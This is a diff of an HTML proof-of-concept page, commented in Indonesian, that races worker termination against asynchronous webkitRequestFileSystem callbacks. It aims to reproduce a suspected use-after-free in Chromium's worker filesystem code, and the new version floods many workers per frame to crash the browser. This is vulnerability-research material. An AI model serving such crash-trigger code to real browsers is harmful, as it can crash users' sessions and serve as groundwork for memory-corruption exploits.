@@ -2,356 +2,160 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Worker FileSystem Race Condition PoC</title>
+    <title>FileSystem UAF Aggressive Stress Test</title>
     <style>
-        body { 
-            font-family: 'Consolas', 'Monaco', monospace; 
-            padding: 20px; 
-            background: #0d1117; 
-            color: #c9d1d9;
-            line-height: 1.4;
-        }
-        h1, h2 { color: #58a6ff; border-bottom: 1px solid #30363d; padding-bottom: 10px; }
-        #controls { 
-            background: #161b22; 
-            padding: 15px; 
-            border-radius: 6px; 
-            margin: 15px 0;
-            border: 1px solid #30363d;
-        }
-        button { 
-            padding: 10px 20px; 
-            margin: 5px; 
-            cursor: pointer; 
-            font-weight: bold; 
-            border: none; 
-            border-radius: 4px;
-            font-size: 14px;
-        }
-        #btnStart { background: #238636; color: white; }
-        #btnStart:hover { background: #2ea043; }
-        #btnStart:disabled { background: #23863680; cursor: not-allowed; }
-        #btnStop { background: #da3633; color: white; }
-        #btnStop:hover { background: #f85149; }
-        #btnClear { background: #30363d; color: #c9d1d9; }
-        #btnClear:hover { background: #484f58; }
-        
-        #stats { 
-            display: flex; 
-            gap: 20px; 
-            margin: 10px 0; 
-            font-size: 13px;
-        }
-        .stat-box { 
-            background: #21262d; 
-            padding: 8px 12px; 
-            border-radius: 4px;
-            border: 1px solid #30363d;
-        }
-        .stat-label { color: #8b949e; }
-        .stat-value { color: #58a6ff; font-weight: bold; }
-        
-        #log { 
-            background: #010409; 
-            border: 1px solid #30363d; 
-            border-radius: 6px;
-            height: 400px; 
-            overflow-y: auto; 
-            padding: 10px; 
-            font-size: 11px;
-            white-space: pre-wrap;
-            word-break: break-all;
-        }
-        .log-entry { margin: 2px 0; }
-        .log-js { color: #7ee787; }
-        .log-cpp { color: #ffa657; }
-        .log-async { color: #d2a8ff; }
-        .log-race { color: #ff7b72; font-weight: bold; }
-        .log-error { color: #f85149; }
-        .log-success { color: #3fb950; }
-        .log-info { color: #8b949e; }
-        
-        code { 
-            background: #6e768130; 
-            padding: 2px 6px; 
-            border-radius: 3px;
-            font-size: 0.95em;
-        }
-        
-        .flow-step { 
-            margin: 8px 0; 
-            padding-left: 15px; 
-            border-left: 2px solid #30363d;
-        }
-        .flow-step.active { border-left-color: #58a6ff; background: #161b2280; padding: 8px 15px; }
+        body { font-family: 'Consolas', monospace; background: #000; color: #0f0; padding: 10px; }
+        #log { height: 60vh; overflow-y: scroll; border: 1px solid #333; background: #111; padding: 5px; font-size: 11px; }
+        .crit { color: #f0f; font-weight: bold; }
+        .err { color: #f00; }
+        .warn { color: #ff0; }
+        .info { color: #0ff; }
+        #overlay { position: fixed; top: 10px; right: 10px; background: #222; padding: 10px; border: 1px solid #f00; }
     </style>
 </head>
 <body>
-
-    <h1>🔬 Worker FileSystem Use-After-Destroy PoC</h1>
-    <p>Target: <code>WorkerGlobalScopeFileSystem::webkitRequestFileSystem</code> (Async)</p>
-    <p>Bug: Callback dipanggil setelah <code>WorkerGlobalScope</code> di-terminate → Use-After-Destroy</p>
-
-    <div id="controls">
-        <button id="btnStart" onclick="startAttack()">▶ Start Race Attack</button>
-        <button id="btnStop" onclick="stopAttack()">⏹ Stop</button>
-        <button id="btnClear" onclick="clearLog()">🗑 Clear Log</button>
-        
-        <div id="stats">
-            <div class="stat-box"><span class="stat-label">Iterations:</span> <span class="stat-value" id="statIter">0</span></div>
-            <div class="stat-box"><span class="stat-label">Callbacks Fired:</span> <span class="stat-value" id="statCb">0</span></div>
-            <div class="stat-box"><span class="stat-label">Status:</span> <span class="stat-value" id="statStatus">IDLE</span></div>
-            <div class="stat-box"><span class="stat-label">Target:</span> <span class="stat-value">webkitRequestFileSystem</span></div>
-        </div>
+    <h1>🔬 Aggressive Worker FileSystem UAF Stress Test</h1>
+    <p>Strategi: Flood IPC Queue → Immediate Double Destroy (Terminate + Remove)</p>
+    
+    <div id="overlay">
+        <div>Count: <span id="count">0</span></div>
+        <div>Callbacks: <span id="cbs">0</span></div>
+        <div>Status: <span id="status" class="warn">READY</span></div>
     </div>
+
+    <button onclick="startStress()">START STRESS</button>
+    <button onclick="stopStress()">STOP</button>
+    <button onclick="document.getElementById('log').innerHTML=''">CLEAR</button>
 
     <div id="log"></div>
 
-    <!-- ========================================
-         INLINE WORKER CODE (Blob)
-         Mengimplementasikan alur JS di flowchart
-         ======================================== -->
-    <script id="worker-code" type="javascript/worker">
-        // [START: JS di Worker] - Langkah 1 di flowchart
-        self.onmessage = function(e) {
-            const { action, quotaSize } = e.data;
-            
-            if (action === 'attack') {
-                // [1] Worker JS memanggil webkitRequestFileSystem
-                log('[JS-1] Calling webkitRequestFileSystem(TEMPORARY, 1024, success, error)');
-                
-                // Request quota dulu agar operasi benar-benar trigger IPC (opsional tapi meningkatkan peluang)
-                if (self.webkitPersistentStorage && quotaSize > 0) {
-                    log('[JS-1a] Requesting quota first...');
-                    self.webkitPersistentStorage.requestQuota(
-                        quotaSize,
-                        function(grantedBytes) {
-                            log('[JS-1b] Quota granted: ' + grantedBytes + ' bytes');
-                            triggerFileSystemAPI();
-                        },
-                        function(err) {
-                            log('[JS-1c] Quota request failed, trying direct call...', 'log-info');
-                            triggerFileSystemAPI();
-                        }
-                    );
-                } else {
-                    triggerFileSystemAPI();
-                }
-            }
-            
-            function triggerFileSystemAPI() {
-                // [1] Inti: Panggil API async yang rentan
-                // Ini akan masuk ke Blink: WorkerGlobalScopeFileSystem::webkitRequestFileSystem
-                try {
-                    self.webkitRequestFileSystem(
-                        self.TEMPORARY,           // type
-                        1024,                     // size
-                        function successCallback(filesystem) {
-                            // [12-14] Callback success dari C++
-                            // ⚠️ RACE: Jika worker sudah terminate, context sudah destroyed!
-                            log('[JS-12] ✅ SUCCESS callback fired!', 'log-success');
-                            log('[JS-13] Filesystem name: ' + (filesystem ? filesystem.name : 'null'), 'log-info');
-                            self.postMessage({ 
-                                type: 'callback-success', 
-                                fsName: filesystem ? filesystem.name : null,
-                                timestamp: Date.now()
-                            });
-                        },
-                        function errorCallback(error) {
-                            // [12b-13b] Callback error dari C++
-                            log('[JS-12b] ❌ ERROR callback fired: code=' + error.code, 'log-error');
-                            self.postMessage({ 
-                                type: 'callback-error', 
-                                errorCode: error.code,
-                                timestamp: Date.now()
-                            });
-                        }
-                    );
-                    log('[JS-10] ✅ webkitRequestFileSystem dispatched (async)');
-                } catch (ex) {
-                    log('[JS-ERR] Exception calling API: ' + ex.message, 'log-error');
-                    self.postMessage({ type: 'api-exception', message: ex.message });
-                }
-            }
-            
-            function log(msg, cls = 'log-js') {
-                self.postMessage({ type: 'log', message: msg, class: cls });
-            }
-        };
-    </script>
-
-    <!-- ========================================
-         MAIN THREAD CODE
-         Mengontrol race condition attack
-         ======================================== -->
-    <script>
-        // State global
-        let isRunning = false;
-        let iteration = 0;
-        let callbacksFired = 0;
-        let workerBlob = null;
-        let workerURL = null;
-        
-        // DOM references
-        const logDiv = document.getElementById('log');
-        const statIter = document.getElementById('statIter');
-        const statCb = document.getElementById('statCb');
-        const statStatus = document.getElementById('statStatus');
-        const btnStart = document.getElementById('btnStart');
-        
-        // ========================================
-        // LOGGING UTILITIES
-        // ========================================
-        function log(msg, cls = 'log-info') {
-            const entry = document.createElement('div');
-            entry.className = 'log-entry ' + cls;
-            entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
-            logDiv.appendChild(entry);
-            logDiv.scrollTop = logDiv.scrollHeight;
-        }
-        
-        function clearLog() {
-            logDiv.innerHTML = '';
-            iteration = 0;
-            callbacksFired = 0;
-            updateStats();
-            log('Log cleared', 'log-info');
-        }
-        
-        function updateStats() {
-            statIter.textContent = iteration;
-            statCb.textContent = callbacksFired;
-        }
-        
-        function setStatus(status, cls = '') {
-            statStatus.textContent = status;
-            statStatus.className = 'stat-value ' + cls;
-        }
-        
-        // ========================================
-        // WORKER SETUP (Blob URL untuk inline code)
-        // ========================================
-        function initWorker() {
-            if (workerURL) return workerURL;
-            
-            const workerCode = document.getElementById('worker-code').textContent;
-            workerBlob = new Blob([workerCode], { type: 'application/javascript' });
-            workerURL = URL.createObjectURL(workerBlob);
-            log('[Main] Worker blob URL created', 'log-info');
-            return workerURL;
-        }
-        
-        // ========================================
-        // ATTACK CONTROL
-        // ========================================
-        function startAttack() {
-            if (isRunning) return;
-            
-            // Cek dukungan API
-            if (!window.webkitRequestFileSystem && !window.webkitPersistentStorage) {
-                log('[Main] ⚠️ WebKit FileSystem API tidak tersedia di browser ini', 'log-error');
-                log('[Main] Coba Chrome versi lama atau enable flag: --enable-experimental-web-platform-features', 'log-info');
-                return;
-            }
-            
-            isRunning = true;
-            iteration = 0;
-            callbacksFired = 0;
-            updateStats();
-            setStatus('RACING...', 'log-success');
-            btnStart.disabled = true;
-            
-            log('═══════════════════════════════════════', 'log-info');
-            log('🚀 Starting Race Condition Attack', 'log-success');
-            log('═══════════════════════════════════════', 'log-info');
-            log('[Main-2] Target: WorkerGlobalScopeFileSystem::webkitRequestFileSystem', 'log-cpp');
-            log('[Main-10] Strategy: Dispatch async → immediate worker.terminate()', 'log-race');
-            log('');
-            
-            initWorker();
-            loopAttack();
-        }
-        
-        function stopAttack() {
-            if (!isRunning) return;
-            isRunning = false;
-            setStatus('STOPPED', 'log-error');
-            btnStart.disabled = false;
-            log('');
-            log('🛑 Attack stopped by user', 'log-error');
-            log('Final stats: ' + iteration + ' iterations, ' + callbacksFired + ' callbacks fired', 'log-info');
-        }
-        
-        // ========================================
-        // RACE CONDITION LOOP (Inti PoC)
-        // ========================================
-        async function loopAttack() {
-            while (isRunning) {
-                iteration++;
-                updateStats();
-                
-                // [2-10] Buat worker baru setiap iterasi = ExecutionContext baru
-                const worker = new Worker(workerURL);
-                const workerId = `W-${iteration}`;
-                
-                // Setup message handler untuk logging dari worker
-                worker.onmessage = (e) => {
-                    const data = e.data;
-                    if (data.type === 'log') {
-                        log(`[${workerId}] ${data.message}`, data.class);
-                    } else if (data.type === 'callback-success' || data.type === 'callback-error') {
-                        callbacksFired++;
-                        updateStats();
-                        // ⚠️ Jika callback fired SETELAH terminate, ini indikasi bug!
-                        log(`[${workerId}] ⚠️ Callback fired post-terminate?! type=${data.type}`, 'log-race');
+    <!-- WORKER SCRIPT -->
+    <script id="worker-src" type="javascript/worker">
+        // Non-standar API, harus dibungkus try-catch agar worker tidak langsung mati saat error
+        try {
+            if (self.webkitRequestFileSystem) {
+                self.onmessage = function(e) {
+                    // Loop internal worker untuk membanjiri antrean IPC
+                    // Kita kirim banyak request sekaligus sebelum worker sempat diproses terminasi
+                    for (let i = 0; i < 5; i++) {
+                        try {
+                            self.webkitRequestFileSystem(
+                                self.TEMPORARY, 
+                                1024 * 1024, // 1MB request (meminta alokasi)
+                                function(fs) {
+                                    // CRITICAL ZONE: Jika ini muncul setelah parent post 'DIE',
+                                    // berarti callback berjalan di context yang sedang/ sudah hancur.
+                                    self.postMessage({ type: 'GHOST_CALLBACK', name: fs.name });
+                                },
+                                function(err) { /* ignore */ }
+                            );
+                        } catch(e) {}
                     }
                 };
-                
-                worker.onerror = (e) => {
-                    // Error setelah terminate adalah expected behavior
-                    // log(`[${workerId}] Worker error: ${e.message}`, 'log-info');
-                };
-                
-                // [1] Kirim perintah attack ke worker
-                worker.postMessage({ 
-                    action: 'attack', 
-                    quotaSize: 5 * 1024 * 1024  // 5MB quota request
-                });
-                log(`[${workerId}] [Main-1] Posted attack message to worker`, 'log-js');
-                
-                // [10a] ⚡ THE KILL: Terminate worker SEGERA setelah dispatch
-                // Ini memicu: ExecutionContext::destroy() → V8 context teardown
-                // Race window: callback C++ mungkin masih return setelah ini
-                worker.terminate();
-                log(`[${workerId}] [Main-10a] 💥 worker.terminate() called`, 'log-race');
-                log(`[${workerId}] [Main-10b] ExecutionContext should be destroyed now`, 'log-race');
-                
-                // Logging periodik agar tidak spam
-                if (iteration % 50 === 0) {
-                    log(`[Main] Iteration ${iteration}... race window active`, 'log-info');
-                }
-                
-                // Yield ke event loop agar:
-                // 1. UI tetap responsif
-                // 2. Race condition lebih natural (non-deterministic scheduling)
-                await new Promise(resolve => setTimeout(resolve, 0));
+            } else {
+                self.postMessage({ type: 'LOG', msg: 'API NOT SUPPORTED', class: 'err' });
+            }
+        } catch(e) {
+            self.postMessage({ type: 'LOG', msg: 'INIT ERROR: ' + e.message, class: 'err' });
+        }
+    </script>
+
+    <script>
+        let running = false;
+        let count = 0;
+        let cbs = 0;
+        let workerBlob = null;
+        let workerUrl = null;
+
+        const logDiv = document.getElementById('log');
+        const countEl = document.getElementById('count');
+        const cbsEl = document.getElementById('cbs');
+        const statusEl = document.getElementById('status');
+
+        function log(msg, cls = '') {
+            const d = document.createElement('div');
+            d.className = cls;
+            d.textContent = `> ${msg}`;
+            logDiv.appendChild(d);
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+
+        function init() {
+            if (workerUrl) return;
+            const code = document.getElementById('worker-src').textContent;
+            workerBlob = new Blob([code], { type: 'application/javascript' });
+            workerUrl = URL.createObjectURL(workerBlob);
+            
+            // Cek ketersediaan API di main thread juga
+            if (!window.webkitRequestFileSystem) {
+                log("PERINGATAN: webkitRequestFileSystem tidak ditemukan di Main Thread.", "warn");
+                log("Browser modern mungkin memblokir API ini. Coba Chrome < 100 atau flag khusus.", "warn");
             }
         }
-        
-        // ========================================
-        // CLEANUP
-        // ========================================
-        window.addEventListener('beforeunload', () => {
-            if (workerURL) {
-                URL.revokeObjectURL(workerURL);
-                log('[Main] Worker blob URL revoked', 'log-info');
+
+        function startStress() {
+            if (running) return;
+            init();
+            running = true;
+            statusEl.textContent = "ATTACKING";
+            statusEl.className = "crit";
+            log("Memulai Stress Test...", "info");
+            stressLoop();
+        }
+
+        function stopStress() {
+            running = false;
+            statusEl.textContent = "STOPPED";
+            statusEl.className = "err";
+            log("Dihentikan.", "warn");
+        }
+
+        function stressLoop() {
+            if (!running) return;
+
+            // Batch attack: Buat 10 worker per frame untuk membebani scheduler
+            for (let i = 0; i < 10; i++) {
+                spawnKillerWorker();
             }
-        });
-        
-        // Auto-start info
-        log('👉 Klik "Start Race Attack" untuk memulai', 'log-info');
-        log('📊 Pantau "Callbacks Fired" - jika > 0 setelah terminate, potensi bug terdeteksi', 'log-info');
-        log('💥 Crash browser = bug berhasil direproduksi (cek chrome://crashes)', 'log-info');
+
+            count += 10;
+            countEl.textContent = count;
+            
+            // Gunakan requestAnimationFrame untuk sinkronisasi dengan refresh rate browser
+            // Ini sering menciptakan timing yang lebih "pas" untuk race condition daripada setTimeout
+            requestAnimationFrame(stressLoop);
+        }
+
+        function spawnKillerWorker() {
+            const w = new Worker(workerUrl);
+            
+            // Listener untuk mendeteksi "Ghost Callback"
+            w.onmessage = function(e) {
+                const d = e.data;
+                if (d.type === 'GHOST_CALLBACK') {
+                    cbs++;
+                    cbsEl.textContent = cbs;
+                    log(`⚠️ GHOST CALLBACK DETECTED! FS: ${d.name}`, "crit");
+                    // Ini adalah indikasi kuat bug lifecycle
+                } else if (d.type === 'LOG') {
+                    log(d.msg, d.class);
+                }
+            };
+
+            // 1. Kirim perintah kerja (Memasukkan task ke antrean IPC)
+            w.postMessage({ action: 'flood' });
+
+            // 2. HANCURKAN SEGERA (Tanpa delay)
+            // Kita paksa thread worker berhenti seketika
+            w.terminate();
+            
+            // 3. Hapus referensi agar GC segera mengambil alih
+            // Ini penting untuk memastikan objek C++ terkait worker di-mark untuk deletion
+            // w = null; 
+        }
+
+        // Logging awal
+        log("Siap. Tekan START.", "info");
     </script>
 </body>
 </html>
